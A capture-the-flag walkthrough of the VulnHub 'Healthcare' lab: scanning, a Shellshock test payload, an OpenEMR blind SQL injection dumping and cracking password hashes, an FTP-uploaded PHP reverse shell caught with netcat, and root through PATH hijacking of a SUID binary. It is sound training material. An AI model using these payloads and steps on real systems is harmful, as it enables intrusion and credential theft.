# Healthcare | VulnHub
https://www.vulnhub.com/entry/healthcare-1,522/

### 1. Scan
```bash
Nmap scan report for 192.168.34.130
Host is up, received arp-response (0.00040s latency).
Scanned at 2021-06-04 20:45:44 EDT for 26s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 ProFTPD 1.3.3d
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.17 ((PCLinuxOS 2011/PREFORK-1pclos2011))
|_http-favicon: Unknown favicon MD5: 7D4140C76BF7648531683BFA4F7F8C22
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 8 disallowed entries 
| /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/ 
|_/all_our_e-mail_addresses /admin/ /
|_http-server-header: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)
|_http-title: Coming Soon 2
MAC Address: 00:0C:29:34:35:18 (VMware)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=6/4%OT=21%CT=1%CU=39735%PV=Y%DS=1%DC=D%G=Y%M=000C29%TM
OS:=60BAC952%P=x86_64-pc-linux-gnu)SEQ(SP=CD%GCD=1%ISR=D3%TI=Z%CI=Z%II=I%TS
OS:=A)OPS(O1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW6%O5=M
OS:5B4ST11NW6%O6=M5B4ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=38
OS:90)ECN(R=Y%DF=Y%T=40%W=3908%O=M5B4NNSNW6%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=3890%S=O%A=S+%F=AS%O=M5B4ST11N
OS:W6%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=
OS:)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%
OS:UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.002 days (since Fri Jun  4 20:43:08 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=205 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Unix

TRACEROUTE
HOP RTT     ADDRESS
1   0.40 ms 192.168.34.130

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun  4 20:46:10 2021 -- 1 IP address (1 host up) scanned in 27.02 seconds
```
The machine is running FTP (ProFTPD 1.3.3d) and an Apache web server, which is the version for something called "PCLinux OS". Ok then.

### 2. Enumerate the website
Checked out the site first, not much going on. There is a robots.txt but doing some googling on the entries it is found to be default for the template. Next ran a dirbust against it.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ dirsearch -u http://192.168.34.130/ -x 403          

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10848

Error Log: /home/kali/Extra-Tools/dirsearch/logs/errors-21-06-04_20-49-32.log

Target: http://192.168.34.130/

Output File: /home/kali/Extra-Tools/dirsearch/reports/192.168.34.130/_21-06-04_20-49-32.txt

[20:49:32] Starting: 
[20:49:32] 301 -  340B  - /js  ->  http://192.168.34.130/js/                                                                            
[20:49:47] 200 -    1KB - /cgi-bin/test.cgi                                                                       
[20:49:48] 301 -  341B  - /css  ->  http://192.168.34.130/css/                    
[20:49:50] 200 -    1KB - /favicon.ico                                           
[20:49:51] 301 -  343B  - /fonts  ->  http://192.168.34.130/fonts/                                    
[20:49:52] 301 -  344B  - /images  ->  http://192.168.34.130/images/
[20:49:52] 200 -    5KB - /index                                                                               
[20:49:52] 200 -    5KB - /index.html    
[20:49:59] 200 -  620B  - /robots.txt                                                                   
                                                                                                                  
Task Completed
```
There is a cgi-bin directory with test.cgi. There is potential exploits that can be done using these, so run Nikto which is the next step to determine that.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ nikto --url http://192.168.34.130   
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.34.130
+ Target Hostname:    192.168.34.130
+ Target Port:        80
+ Start Time:         2021-06-04 20:50:28 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)
+ Server may leak inodes via ETags, header found with file /, inode: 264154, size: 5031, mtime: Sat Jan  6 01:21:38 2018
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ "robots.txt" contains 8 entries which should be manually viewed.
+ Apache/2.2.17 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 9543 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2021-06-04 20:51:42 (GMT-4) (74 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
Nikto does indicate the the site appears vulnerable to Shellshock. Testing it though appears to indicate otherwise.
```bash
┌──(kali㉿kali)-[]-[~/Desktop/resources/exploits/linux]
└─$ curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://192.168.34.130/cgi-bin/test.cgi
<b>Date: Sat Jun  5 04:05:42 2021</b><br>
<hr><h1>It worked!</h1>
This script runs under: CGI/1.1<hr></n%ENV: <br>
SCRIPT_NAME = /cgi-bin/test.cgi <br>
SERVER_NAME = (Hidden for security purposes) <br>
SERVER_ADMIN = (Hidden for security purposes) <br>
REQUEST_METHOD = GET <br>
HTTP_ACCEPT = */* <br>
SCRIPT_FILENAME = (Hidden for security purposes) <br>
SERVER_SOFTWARE = (Hidden for security purposes) <br>
QUERY_STRING =  <br>
REMOTE_PORT = 36104 <br>
HTTP_USER_AGENT = () { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id <br>
SERVER_SIGNATURE = Apache-AdvancedExtranetServer (Complete info hidden) <br>
SERVER_PORT = (Hidden for security purposes) <br>
REMOTE_ADDR = 192.168.34.138 <br>
SERVER_PROTOCOL = HTTP/1.1 <br>
PATH = (Hidden for security purposes) <br>
REQUEST_URI = /cgi-bin/test.cgi <br>
GATEWAY_INTERFACE = CGI/1.1 <br>
SERVER_ADDR = (Hidden for security purposes) <br>
DOCUMENT_ROOT = (Hidden for security purposes) <br>
HTTP_HOST = 192.168.34.130 <br>
MOD_PERL = (Hidden for security purposes) <br>
UNIQUE_ID = YLtahn8AAAEAAA-aCCQAAAAE <br>
```
Try a few other methods, but with no luck. My theory is that something in PCLinux OS generates a false-positive. With this avenue explored, time to go deeper with a bigger directory search. Note this particular wordlist is probably a bit too big, possibly a wordlist that just has web application names in it would be better to try before this one in the future.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ gobuster dir -u http://192.168.34.130 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 40 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.34.130
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/04 21:12:16 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 5031]
/images               (Status: 301) [Size: 344] [--> http://192.168.34.130/images/]
/css                  (Status: 301) [Size: 341] [--> http://192.168.34.130/css/]   
/js                   (Status: 301) [Size: 340] [--> http://192.168.34.130/js/]    
/vendor               (Status: 301) [Size: 344] [--> http://192.168.34.130/vendor/]
/favicon              (Status: 200) [Size: 1406]                                   
/robots               (Status: 200) [Size: 620]                                    
/fonts                (Status: 301) [Size: 343] [--> http://192.168.34.130/fonts/] 
/gitweb               (Status: 301) [Size: 344] [--> http://192.168.34.130/gitweb/]
/phpMyAdmin           (Status: 403) [Size: 59]                                     
/server-status        (Status: 403) [Size: 1000]                                   
/server-info          (Status: 403) [Size: 1000]                                   
/openemr              (Status: 301) [Size: 345] [--> http://192.168.34.130/openemr/]
                                                                                    
===============================================================
2021/06/04 21:27:29 Finished
===============================================================
```
In any case, note that this time the search found /openemr, which is an OpenEMR web application for medical practices with the login page accessible publically.  
The version of the application is 4.1.0, which is vulnerable to unauthenticated blind SQL injection.

### 3. Retrieve usernames and passwords
The vulnerable parameter in the application is at: "http://192.168.34.130/openemr/interface/login/validateUser.php?u=". This "u" parameter can be injected into, and while it won't provide any on-screen feedback to the attacker, use of the sleep() function allows database information to be extracted.
The exploit at https://www.exploit-db.com/exploits/49742 uses a sleep timer of 3 seconds to pull the data out of the database.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ python3 exploit.py                                                                                       

   ____                   ________  _______     __ __   ___ ____ 
  / __ \____  ___  ____  / ____/  |/  / __ \   / // /  <  // __ \
 / / / / __ \/ _ \/ __ \/ __/ / /|_/ / /_/ /  / // /_  / // / / /
/ /_/ / /_/ /  __/ / / / /___/ /  / / _, _/  /__  __/ / // /_/ / 
\____/ .___/\___/_/ /_/_____/_/  /_/_/ |_|     /_/ (_)_(_)____/  
    /_/
    ____  ___           __   _____ ____    __    _               
   / __ )/ (_)___  ____/ /  / ___// __ \  / /   (_)              
  / /_/ / / / __ \/ __  /   \__ \/ / / / / /   / /               
 / /_/ / / / / / / /_/ /   ___/ / /_/ / / /___/ /                
/_____/_/_/_/ /_/\__,_/   /____/\___\_\/_____/_/   exploit by @ikuamike 

[+] Finding number of users...
[+] Found number of users: 2
[+] Extracting username and password hash...
admin:3863efef9ee2bfbc51ecdca359c6302bed1389e8
medical:ab24aed5a7c4ad45615cd7e0da816eea39e4895d 
```
These passwords crack to give two credential sets: `admin:ackbar` and `medical:medical`

### 4. Access FTP
Take these credentials and try them over FTP. Admin doesn't work, but medical does.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ftp 192.168.34.130
Connected to 192.168.34.130.
220 ProFTPD 1.3.3d Server (ProFTPD Default Installation) [192.168.34.130]
Name (192.168.34.130:kali): medical
331 Password required for medical
Password:
230 User medical logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr--r--   2 medical  medical      4096 Nov  5  2011 Desktop
drwx------   2 medical  medical      4096 Nov  5  2011 Documents
drwx------   2 medical  medical      4096 Oct 27  2011 Downloads
drwx------   2 medical  medical      4096 Jan 19  2010 Movies
drwx------   2 medical  medical      4096 Jan 19  2010 Music
drwx------   2 medical  medical      4096 Oct 27  2011 Pictures
drwxr-xr-x   2 medical  medical      4096 Jul 20  2011 Templates
drwxr-xr-x   2 medical  medical      4096 Jul 20  2011 Videos
drwx------   9 medical  medical      4096 Nov  5  2011 tmp
226 Transfer complete
```
It turns out, this access provides wide-open access to all the files on the machine with the permissions of "medical". This includes the web root. Although most of the directories are owned by "root" in here for some reason, the openemr directory is owned by "medical" and so files can be written into it.
```bash
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 medical  medical     19798 Sep 21  2011 4_1_prep_release
-rwxr-xr-x   1 medical  medical     22442 Sep 21  2011 CategoryTreeMenu.js
-rwxr-xr-x   1 medical  medical     22817 Sep 21  2011 DocumentTreeMenu.js
drwxr-xr-x   4 medical  medical      4096 Sep 21  2011 Documentation
-rw-r--r--   1 medical  medical     14299 Sep 21  2011 INSTALL
-rw-r--r--   1 medical  medical       414 Sep 21  2011 README
drwxr-xr-x   2 medical  medical      4096 Sep 21  2011 Tests
drwxr-xr-x   2 medical  medical      4096 Sep 21  2011 accounting
-rw-r--r--   1 medical  medical     14926 Sep 21  2011 acl_setup.php
-rw-r--r--   1 medical  medical     29444 Sep 21  2011 acl_upgrade.php
-rw-------   1 medical  medical      3707 Sep 21  2011 admin.php
drwxr-xr-x   4 medical  medical      4096 Sep 21  2011 ccr
drwxr-xr-x   7 medical  medical      4096 Sep 21  2011 contrib
-rw-r--r--   1 medical  medical       133 Sep 21  2011 controller.php
drwxr-xr-x   2 medical  medical      4096 Sep 21  2011 controllers
-rw-r--r--   1 medical  medical      2873 Sep 21  2011 copyright_notice.html
drwxr-xr-x   2 medical  medical      4096 Sep 21  2011 custom
drwxr-xr-x   9 medical  medical      4096 Sep 21  2011 gacl
drwxr-xr-x   2 medical  medical      4096 Sep 21  2011 images
drwxr-xr-x   2 medical  medical      4096 Sep 21  2011 includes
-rw-r--r--   1 medical  medical       999 Sep 21  2011 index.php
drwxr-xr-x  25 medical  medical      4096 Sep 21  2011 interface
-rw-r--r--   1 medical  medical      4850 Sep 21  2011 ippf_upgrade.php
drwxr-xr-x  14 medical  medical      4096 Sep 21  2011 library
-rw-r--r--   1 medical  medical     18010 Sep 21  2011 license.txt
-rw-r--r--   1 medical  medical      2109 Sep 21  2011 login.php
drwxr-xr-x   3 medical  medical      4096 Sep 21  2011 modules
drwxr-xr-x   3 medical  medical      4096 Sep 21  2011 myportal
drwxr-xr-x   4 medical  medical      4096 Sep 21  2011 patients
drwxr-xr-x  10 medical  medical      4096 Sep 21  2011 phpmyadmin
-rw-r--r--   1 medical  medical       861 Sep 21  2011 phpunit.xml
-rw-r--r--   1 medical  medical     29416 Sep 21  2011 setup.php
drwxr-xr-x   4 apache   apache       4096 Oct 27  2011 sites
-rw-r--r--   1 medical  medical     12749 Sep 21  2011 sl_convert.php
drwxr-xr-x   2 medical  medical      4096 Sep 21  2011 sql
-rw-r--r--   1 medical  medical      9853 Sep 21  2011 sql_upgrade.php
drwxr-xr-x  14 medical  medical      4096 Sep 21  2011 templates
-rw-r--r--   1 medical  medical       596 Sep 21  2011 version.php
226 Transfer complete
ftp> put test.txt
local: test.txt remote: test.txt
200 PORT command successful
150 Opening BINARY mode data connection for test.txt
226 Transfer complete
6 bytes sent in 0.00 secs (48.8281 kB/s)
```

### 5. Get a shell
Upload a php reverse shell file.
```bash
ftp> put rev.php
local: rev.php remote: rev.php
200 PORT command successful
150 Opening BINARY mode data connection for rev.php
226 Transfer complete
2150 bytes sent in 0.00 secs (16.8066 MB/s)
```
Access it in the browser to get the shell.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ nc -lvnp 9999                      
listening on [any] 9999 ...
connect to [192.168.34.138] from (UNKNOWN) [192.168.34.130] 42957
Linux localhost.localdomain 2.6.38.8-pclos3.bfs #1 SMP PREEMPT Fri Jul 8 18:01:30 CDT 2011 i686 i686 i386 GNU/Linux
 04:44:15 up  1:01,  0 users,  load average: 1.00, 2.32, 9.97
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
uid=479(apache) gid=416(apache) groups=416(apache)
sh: no job control in this shell
sh-4.1$ id  
id
uid=479(apache) gid=416(apache) groups=416(apache)
```

### 6. Switch users
Since the medical password is known, switch to that user.
```bash
bash-4.1$ su - medical
Password: 
[medical@localhost ~]$
```
Check out the user's home folder.
```bash
[medical@localhost ~]$ ls -R
.:
Desktop/    Downloads/  Music/     Templates/  Videos/
Documents/  Movies/     Pictures/  tmp/

./Desktop:
addlocale.desktop*     draknetcenter.desktop*
drakfirewall.desktop*  Get Libre Office.desktop*

./Documents:
OpenEMR Passwords.pdf*  Passwords.txt

./Downloads:
openemr-4.1.0.tar.gz

./Movies:

./Music:

./Pictures:
pclosmedical.png

./Templates:

./tmp:
debug.log        keyring-hSBjUb/  orbit-root/          ssh-RoIgQkNbu874/
keyring-fPbG5t/  orbit-medical/   pulse-8LagrogWihJO/  ssh-XLjWYherh886/

./tmp/keyring-fPbG5t:

./tmp/keyring-hSBjUb:

./tmp/orbit-medical:
bonobo-activation-register-b415b005c8435facdf68405e0000002c.lock*
bonobo-activation-register-d37436b21aa5f1f34a448a3a00000028.lock*
bonobo-activation-server-b415b005c8435facdf68405e0000002c-ior
bonobo-activation-server-d37436b21aa5f1f34a448a3a00000028-ior

./tmp/orbit-root:

./tmp/pulse-8LagrogWihJO:
pid

./tmp/ssh-RoIgQkNbu874:

./tmp/ssh-XLjWYherh886:

./Videos:
```
Look at Passwords.txt.
```bash
[medical@localhost ~]$ cat Documents/Passwords.txt
PCLINUXOS MEDICAL
root-root
medical-medical


OPENEMR
admin-admin
medical-medical
```
Sadly the root password is not root anymore, that would have been too easy.
When checking out SETUID applications present on the machine, notice there is a non-standard one present in /usr/bin.
```bash
[medical@localhost ~]$ ls -l /usr/bin/healthcheck
-rwsr-sr-x 1 root root 5813 Jul 29  2020 /usr/bin/healthcheck*
[medical@localhost ~]$ strings /usr/bin/healthcheck 
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
setuid
system
setgid
__libc_start_main
GLIBC_2.0
PTRhp
[^_]
clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h
```
When running strings it can be seen that the application calls a number of different utilities to print information about the system to the screen. Since these utilities are not specified with full paths, it should be possible to hijack the path and gain code execution.

### 7. Escalate to root
Working out of the /tmp directory - firstly create a small script that calls /bin/sh, called "clear". Give it execution permissions, and add the /tmp path onto the end of the PATH environment variable. Then just call the binary to elevate to root.
```bash
[medical@localhost tmp]$ cat << EOF > clear
> #!/bin/sh
> /bin/sh
> EOF
[medical@localhost tmp]$ chmod +x clear
[medical@localhost tmp]$ ls -l clear
-rwxrwxr-x 1 medical medical 18 Jun  5 05:16 clear*
[medical@localhost tmp]$ export PATH=/tmp:$PATH
[medical@localhost tmp]$ echo $PATH
/tmp:/bin:/usr/bin:/usr/local/bin:/usr/bin/X11:/usr/games:/usr/lib/qt4/bin:/home/medical/bin
[medical@localhost tmp]$ /usr/bin/healthcheck
sh-4.1# whoami
root
```